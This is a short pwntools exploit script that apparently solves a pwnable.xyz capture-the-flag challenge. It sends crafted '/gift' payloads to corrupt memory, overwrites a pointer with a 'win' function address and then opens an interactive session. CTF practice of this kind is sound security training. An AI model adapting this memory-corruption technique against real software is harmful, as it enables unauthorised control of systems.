from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30034)

win=0x400cae

print(target.recvuntil("> "))

def attack(size,data):
	target.send("/gift\n\x00")
	print(target.recvuntil(": "))
	target.sendline(str(size))
	print(target.recvuntil(": "))
	target.send(data)
	print(target.recvuntil("> "))

payload="\xde"*(0x100-10)+"\xef"*(9)+"\xf2"+"\xbf"*239+"\xbe"*(256-239)
attack(256*2,payload)
attack(0x20,p64(win)*4)
target.send("A\n")

target.interactive()
	
	
	
	
		
